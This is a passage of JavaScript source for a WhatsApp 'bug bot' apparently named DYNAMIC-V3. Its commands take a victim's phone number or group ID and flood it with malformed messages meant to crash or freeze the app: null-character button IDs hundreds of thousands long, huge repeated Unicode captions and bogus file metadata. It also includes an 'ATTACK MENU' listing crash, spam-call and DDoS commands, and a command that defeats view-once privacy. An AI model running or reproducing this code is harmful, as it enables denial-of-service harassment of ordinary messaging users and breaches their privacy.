              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "PL TESTING",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };
  console.log(chalk.blue.bold("Done Bug 🦂"))
}
async function allin(target) {
      for (let i = 0; i < 1; i++) {
        await crashcursor(target, ptcp = true)   
        await InvisibleLoadFast(target);  
        await forcec(target)
        await crashcursor(target, ptcp = true)
        await InvisibleLoadFast(target);  
        await forcec(target)     
        await crashcursor(target, ptcp = true) 
        await crashcursor(target, ptcp = true) 
        
        await InvisibleLoadFast(target)  ;                    await forcec(target)
        
        await crashcursor(target, ptcp = true)
        await crashcursor(target, ptcp = true)
      }
      console.log(chalk.red.bold(`SEND BUGS FORCE TO ${target}`))
      }
      
//
const ctt = {
			key: {
				remoteJid: '0@s.whatsapp.net', // 'status@broadcast', menggunakan remote jid bernilai 'statusbroadcast' akan menyebabkan pesan crash pada wa desktop. sebagai alternatif, saya menggunakan nilai '0@s.whatsapp.net'
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				contactMessage: {
					displayName: (pushname),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
				}
			}
		};

async function buttonCrash(target) {
    sam.sendMessage(m.chat, {
        image: pici,
        caption: "forcec" + "ꦾ".repeat(50000),
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `ֆքɨɖɛʀӼ ɛӼƈʊȶɛʀ`,
                body: `ֆքɨɖɛʀӼ ɛӼƈʊȶɛʀ`,
                previewType: "VIDEO",
                thumbnailUrl: pici,
                sourceUrl: "t.me/The_Chosen_001",
                mediaUrl: global.url2,
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
                advertiserName: " x ",
                mediaType: "IMAGE",
                jpegThumbnail: null,
                caption: " x ",
            },
            placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
                url: "t.me/The_Chosen_001",
                buttonTitle: "konstol",
            },
            disappearingMode: {
                initiator: 1,
                trigger: 2,
                initiatorDeviceJid: target,
                initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
                title: "! ֆքɨɖɛʀӼ ɛӼƈʊȶɛʀ- \"𝗋34\" 🩸",
                mediaType: 2,
                renderLargerThumbnail: false,
                showAdAttribution: false,
                containsAutoReply: false,
                body: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝",
                thumbnail: null,
                sourceUrl: "go fuck yourself",
                sourceId: "dvx - problem",
                ctwaClid: "cta",
                ref: "ref",
                clickToWhatsappCall: true,
                automatedGreetingMessageShown: false,
                greetingMessageBody: "kontol",
                ctaPayload: "cta",
                disableNudge: true,
                originalImageUrl: "konstol",
            },
            featureEligibilities: {
                cannotBeReactedTo: true,
                cannotBeRanked: true,
                canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363222395675670@newsletter",
                serverMessageId: 1,
                newsletterName: `ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                contentType: 3,
                accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
                utmSource: "utm",
                utmCampaign: "utm2",
            },
            quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype:
                            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "PL",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath:
                            "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption:
                            "a sorry word won't kill you, you can face fear",
                    },
                    contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                    footerText: "© running since 2020 to 20##?",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(900000),
                            buttonText: {
                                displayText: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢ 𝐍𝐓͢ 𐎟",
                            },
                            type: 1,
                        },
                    ],
                    headerType: 3,
                },
            },
        },
    }, { quoted: ctt });
}
			async function chanelEnd(target) {
sam.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: pici },
    fileName: "𝐊𝐢𝐧𝐠 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮 𝐂𝐫𝐚𝐬𝐡",
    fileLength: 99999999999999,
    pageCount: 100,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: "ֆքɨɖɛʀӼ ɛӼƈʊȶɛʀ" + "ꦾ".repeat(50000),
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: "t.me/The_Chosen_001",
            thumbnailUrl: pici,
            title: `${pushname}`,
            body: "ֆքɨɖɛʀӼ ɛӼƈʊȶɛʀ" + "ꦾ".repeat(50000),
        },
        forwardingScore: 10,
        isForwarded: false,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: "2349116057855@s.whatsapp.net"
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363297314470847@newsletter',
            serverMessageId: null,
            newsletterName: "Wʜᴀᴛsᴀᴘᴘ Bᴀɪʟᴇʏs Sᴇʀᴠɪᴄᴇ"
        }
    }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `ֆքɨɖɛʀӼ ɛӼƈʊȶɛʀ`}}})
  }
  async function buttonCrash2(target) {
    sam.sendMessage(m.chat, {
        image: pici,
        caption: "ֆքɨɖɛʀӼ ɛӼƈʊȶɛʀ" + "ꦾ".repeat(50000),
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `ֆքɨɖɛʀӼ ɛӼƈʊȶɛʀ`,
                body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                previewType: "VIDEO",
                thumbnailUrl: pici,
                sourceUrl: "The_Chosen_001",
                mediaUrl: global.url2,
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
                advertiserName: " x ",
                mediaType: "IMAGE",
                jpegThumbnail: null,
                caption: " x ",
            },
            placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
                url: "t.me/The_Chosen_001",
                buttonTitle: "konstol",
            },
            disappearingMode: {
                initiator: 1,
                trigger: 2,
                initiatorDeviceJid: target,
                initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
                title: "! SPIDER-X- \"𝗋34\" 🩸",
                mediaType: 2,
                renderLargerThumbnail: false,
                showAdAttribution: false,
                containsAutoReply: false,
                body: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝",
                thumbnail: null,
                sourceUrl: "go fuck yourself",
                sourceId: "dvx - problem",
                ctwaClid: "cta",
                ref: "ref",
                clickToWhatsappCall: true,
                automatedGreetingMessageShown: false,
                greetingMessageBody: "kontol",
                ctaPayload: "cta",
                disableNudge: true,
                originalImageUrl: "konstol",
            },
            featureEligibilities: {
                cannotBeReactedTo: true,
                cannotBeRanked: true,
                canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363222395675670@newsletter",
                serverMessageId: 1,
                newsletterName: `ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                contentType: 3,
                accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
                utmSource: "utm",
                utmCampaign: "utm2",
            },
        },
    }, { quoted: ctt });
}


			async function bugLoad(target) {
for (let i = 0; i < 5; i++) {
await chanelEnd(target)
await buttonCrash(target)
await buttonCrash2(target)
}
}

//

//
  async function freezegc(target) {	
          const jids = `_*~@254104301695~*_\n`.repeat(10200);
	      const ui = 'ꦽ'.repeat(1500);	
		    let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
		           groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ui + jid,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝙎𝙋𝙄𝘿𝙀𝙍-𝙓 " }]
                               }
                            }
						}
					},
				}), {
					userJid: target
				}
			);
			await sam.relayMessage(target, etc.message, {});
		}

//===================°°
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}		
		
//=========================================//

switch (command) {
//==================≠==========≠===========≠//
case 'menu':{
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
caption =`
   𝘿𝙔𝙉𝘼𝙈𝙄𝘾 - 𝙑3 
┏━━━━━━━━━━━━
┃◎ 𝙷𝙴𝙻𝙻𝙾 :  ${m.pushName} 
┃◎ 𝙿𝚁𝙴𝙵𝙸𝚇 : ${prefix}
┃◎ 𝙿𝙸𝙽𝙶 : ${latensi.toFixed(4)}
┃◎ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${run}
┃◎ 𝙾𝚆𝙴𝙽𝙴𝚁 𝙽𝚄𝙼 : +44 7707 031326
┃◎ 𝙾𝚆𝙽𝙴𝚁 𝙽𝙰𝙼𝙴 : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┗━━━━━━━━━━━━━━
   𝗢𝗪𝗡𝗘𝗥 𝗖𝗠𝗗
┏━━━━━━━━━━━━━━
┃ ◉ 𝚊𝚍𝚍𝚙𝚛𝚎𝚖
┃ ◉ 𝚍𝚎𝚕𝚙𝚛𝚎𝚖
┃ ◉ 𝚕𝚒𝚜𝚝𝚙𝚛𝚎𝚗
┃ ◉ 𝚜𝚎𝚕𝚏
┃ ◉ 𝚙𝚞𝚋𝚕𝚒𝚌
┗━━━━━━━━━━━━━━
   𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗘𝗡𝗨
┏━━━━━━━━━━━━━━
┃ ◉ 𝚏𝚕𝚘𝚒𝚍 254#### 
┃ ◉ 𝚍𝚎𝚙𝚕𝚎𝚝 254####
┃ ◉ dhoom 254#### ( brutal )
┃ ◉ 𝚝𝚛𝚊𝚜𝚑 254####
┃ ◉ 𝚍𝚌𝚑𝚊𝚗𝚗𝚎𝚕 ( 𝚍𝚒𝚛𝚎𝚌𝚝 𝚒𝚗 𝚌𝚑𝚊𝚗𝚗𝚎𝚕 )
┃ ◉ 𝚊𝚗𝚝𝚒𝚋𝚕𝚘𝚌𝚔 ( 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚖 )
┃ ◉ 𝚏𝚌-𝚌𝚛𝚊𝚜𝚑 254###
┃ ◉ 𝚍y𝚐𝚌 ( 𝚐𝚌 𝚕𝚒𝚗𝚔 )
┃ ◉ 𝚍gcv2 ( gc id )
┃ ◉ 𝚍𝚢𝚠𝚎𝚋 ( 𝚍𝚒𝚛𝚎𝚌𝚝 𝚍𝚖 𝚠𝚎𝚋 𝚞𝚜𝚎𝚛 )
┃ ◉ 𝚝𝚛𝚊𝚜𝚑-𝚒𝚘𝚜 254### ( 𝚒𝚘𝚜 )
┃ ◉ 𝚒𝚗𝚟𝚒 254### ( 𝚒𝚘𝚜 )
┃ ◉ 𝚍𝚛𝚎𝚊𝚖𝚜 ( 𝚍𝚒𝚛𝚎𝚌𝚝 𝚍𝚖 )
┃ ◉ 𝚍𝚎𝚊𝚝𝚑 ( 𝚍𝚒𝚛𝚎𝚌𝚝 𝚍𝚖 )
┃ ◉ 𝚍𝚍𝚘𝚜 
┃ ◉ listgc
┃ ◉ dgcv3 ( direct gc )
┃ ◉ linked-d ( special for linked devices)
┃ ◉ 𝚜𝚙𝚊𝚖𝚌𝚊𝚕𝚕
┃ ◉ 𝚜𝚙𝚊𝚖𝚟𝚒𝚍
┃ ◉ 𝚌𝚑𝚎𝚌𝚔𝚑𝚘𝚜𝚝
┃ ◉ 𝚌𝚕𝚎𝚊𝚛𝚋𝚞𝚐 
┗━━━━━━━━━━━━━━
> 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢
┏━━━━━━━━━━━━━━⚛
┃ ♞ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ( 𝙙𝙚𝙫 )
┃ ♞ 𝗠𝗮𝗿𝗸 𝗭𝘂𝗰𝗸𝗲𝗿𝗯𝗲𝗴 ( 𝙨𝙪𝙥𝙥𝙤𝙧𝙩 )
┃ ♞ 𝗠𝘆 𝗧𝗲𝗮𝗺 ( 𝙨𝙪𝙥𝙥𝙤𝙧𝙩 )
┃ ♞ 𝙆𝙞𝙣𝙜 𝙎𝙖𝙢 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 ( 𝙨𝙪𝙥𝙥𝙤𝙧𝙩 )
┗━━━━━━━━━━━━━━━⚛
  `
sam.sendMessage(m.chat, { 
	           text: caption,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝙳𝚈𝙽𝙰𝙼𝙸𝙲-𝚅3`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://files.catbox.moe/912b7u.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: music,
mimetype: 'audio/mpeg'
}, { quoted: gcq
})
}
break
case "listgc":{
	if (!isOwner) return reply(mess.premium)
let getGroups = await sam.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await sam.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks)
  }
break
case 'antiblock':
    if (!isOwner) return
    
    for (let i = 0; i < 11; i++) { // ali no "1111" define quantidade qui vai enviar
    await sleep(1050);
await sam.relayMessage((q || from), {
"messageContextInfo": {
"messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
"deviceListMetaData": {},
"deviceListMetadataVersion": 2
},
"scheduledCallCreationMessage": {
"scheduledTimestampMs": '1200',
callType: "AUDIO",
"title": '👻',
}
}, {additionalAttributes:{
edit: '7'
}})
}
break;

case 'dgcv2':
	if (!isOwner) return reply(mess.premium)
	if (!q) return reply(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .group-id link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return reply("Group ID must be a number, not a link. Use .group-id <link> to get the group ID.");
    }
victim = text.split("|")[0]
async function xeongroupnew1(target){
await sam.relayMessage(target,{
extendedTextMessage:{
text: 'DYNAMIC-😹',
contextInfo: {
stanzaId: sam.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "💀 DYNAMIC",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
contactVcard: true,
caption: "\n"
},
contentText: "༑",
footerText: "🚫 DYNAMIC-V3",
buttons: [{
buttonId: "\u0000".repeat(850000),
buttonText: {
displayText: "𐎟"
},
type: 1
}],
headerType: 3
}
},
}}},{})
}
reply(`Successfully sent bug to the group chat`)
for (let i = 0; i < 1; i++) {
	await xeongroupnew1(victim)
	await xeongroupnew1(victim)
	await xeongroupnew1(victim)
	
    }
break
case 'dgcv3': case 'linked-d':
async function UnicornXeon(jides,definirText) {await sam.relayMessage(jides, {extendedTextMessage: {text: definirText},"deviceSentMessage": {"phash": ""}}, {});}
const stanza = [{attrs: { biz_bot: '1' },tag: "bot",},{attrs: {},tag: "biz",},];
const xeoncres = {
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "💍",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
contactVcard: true,
caption: "\n"
},
contentText: "🚫",
footerText: "🪪",
buttons: [{
buttonId: "\u0000".repeat(850000),
buttonText: {
displayText: "𐎟"
},
type: 1
}],
headerType: 3
}
}}
await reply(`Bug is being sent\n\nNote: Do not unarchive this chat.`)
await sam.chatModify({archive: true,lastMessages: [{key: m.key,messageTimestamp: "9999",fromMe: false}]}, from)
await sam.sendMessage(from, {text: "드림",mentions: [m.sender],footer: "드림",buttons: [{buttonId: "hi",buttonText: {displayText: m}},{buttonId: "hi2", buttonText: {displayText: m}}],viewOnce: true,headerType: 6,}, {})
for (let i = 0; i < 30; i++) {
await sam.sendMessage(from, {sticker: {url: './69/xeon_crashed.webp'},contextInfo: {participant: "0@s.whatsapp.net",remoteJid: "status@broadcast",quotedMessage: xeoncres.quotedMessage}})
}
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
await sleep(3000)
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
break
case 'dchannel': {
for (let i = 0; i < 3; i++) {
await bugLoad(m.chat)
await sleep(1000)
}
await sam.sendMessage(m.chat, { react: { text: '🕊️', key: m.key } });
console.log(chalk.red.bold("Done Kill Chat"))
}
break
case 'dhoom':
    if (!isOwner) return reply(mess.premium)
	if (!q) return reply(`Example:\n ${prefix + command} 254###`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await sam.onWhatsApp(Xreturn);
  if (victim == "254742491666") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply(`
┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`)
    for (let count = 0; count < 10; count++) {  // تكرار 10 مرات
    
        tmsg = await generateWAMessageFromContent(Xreturn, {
            "buttonsMessage": {
                "text": "° ᎴᎩᏁᏗ ᏦᎥᏝᏝ",
                "imageMessage": {
                    "url": "https://mmg.whatsapp.net/v/t62.7118-24/21432291_3992350524356755_3359175269186937102_n.enc?ccb=11-4&oh=01_Q5AaIK5gi1wSNDajnd99Ao1_3-ywQg_hopUd_hpbnEe0bIBd&oe=67C77FF2&_nc_sid=5e03e0&mms3=true",
                    "mimetype": "image/jpeg",
                    "fileSha256": "Wnf6QkilVowZ5j2UfTlNNF3LQ8g16qLi3QzYXhiObO0=",
                    "fileLength": "92017",
                    "height": 640,
                    "width": 640,
                    "mediaKey": "8Kz+VGfENvlBayk1bPdmzAkuqPlDMDrcc4ucoC4adWQ=",
                    "fileEncSha256": "++njdY0Csz3sCDfQnDFZ+lWyaCjbPhV0jtF5nL0O+3Y=",
                    "directPath": "/v/t62.7118-24/21432291_3992350524356755_3359175269186937102_n.enc",
                    "mediaKeyTimestamp": "1738541032",
                    "jpegThumbnail": pici
                },
                "contentText": "ᎴᎩᏁᏗ ᏦᎥᏝᏝ",
                "footerText": "ᎴᎩᏁᏗ ᏦᎥᏝᏝ",
                "buttons": [
                    {
                        "buttonId": "\u0000".repeat(399999),
                        "buttonText": {"displayText": "@DGXeon"},
                        "type": "RESPONSE"
                    }
                ],
                "headerType": "IMAGE"
            }
        }, {});

        await sam.relayMessage("status@broadcast", tmsg.message, {
            messageId: tmsg.key.id,
            statusJidList: [Xreturn],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: Xreturn },
                                    content: undefined,
                                }
                            ],
                        }
                    ],
                }
            ],
        });

        const iamquoted = {
            key: {
                fromMe: false,
                stanzaId: tmsg.key.id,
                participant: "13135550002@s.whatsapp.net",
                remoteJid: "status@broadcast",
            },
            message: {
                extendedTextMessage: {
                    text: '*~_ᎴᎩᏁᏗ ᏦᎥᏝᏝ_~*'
                }
            }
        };

        await sam.sendMessage(Xreturn, { text: '\n' }, { quoted: iamquoted });

        await sleep(10000);

        for (let i = 0; i < 50; i++) {
            await sam.relayMessage(Xreturn, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2,
                        },
                        interactiveMessage: {
                            body: {
                                text: " ᎴᎩᏁᏗ ᏦᎥᏝᏝ ",
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    { name: "single_select", buttonParamsJson: "" },
                                    { name: "call_permission_request", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                ]
                            }
                        }
                    }
                }
            }, { participant: { jid: Xreturn } });
        }
    }

    break;
case "public": {
if (!isOwner) return reply(mess.owner)
sam.public = true
reply("𝙳𝚈𝙽𝙰𝙼𝙸𝙲-𝚅3 𝙸𝚂 𝙾𝙽 𝙿𝚄𝙱𝙻𝙸𝙲 𝙼𝙾𝙳𝙴")
}
break
case "ping": case "speed": { 
let timestamp = speed()
let latensi = speed() - timestamp

         reply (`━━━━━━━━━━━━━━━━━\n\◉ 𝙷𝙴𝙻𝙻𝙾 ${m.pushName}\n\━━━━━━━━━━━━━━━━━\n\◈𝙳𝚈𝙱𝙰𝙼𝙸𝙲 𝚂𝙿𝙴𝙴𝙳  : ${latensi.toFixed(4)} 𝐌𝐒\n\━━━━━━━━━━━━━━━━━`); 
         } 
 break; 
case "runtime":
                let pinga = `𝙳𝚈𝙽𝙰𝙼𝙸𝙲-𝚅3 𝙸𝚂 𝙰𝙲𝚃𝙸𝚅𝙴 𝙵𝙾𝚁 ${runtime(process.uptime())}`
               sam.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝙳𝚈𝙽𝙰𝙼𝙸𝙲-𝚅3`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: pic ,
                            sourceUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: zets
                })
                break
case "self": {
if (!isOwner) return reply(mess.owner)
sam.public = false
reply(" *𝙳𝚈𝙽𝙰𝙼𝙸𝙲-𝚅3 𝙸𝚂 𝙾𝙽 𝚂𝙴𝙻𝙵 𝙼𝙾𝙳𝙴*")
}
break

 
case 'vv': {

  if (!m.quoted) return m.reply("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return m.reply("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return m.reply("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await sam.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await sam.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await sam.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break
  
        
case 'floid': case 'deplet': case 'fc-crash' : case 'trash' :{
if (!isOwner) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`)
if (!q) return reply(`Example: ${prefix + command} 254###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚙𝚛𝚘𝚌𝚎𝚜𝚜𝚒𝚗𝚐 🪐
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
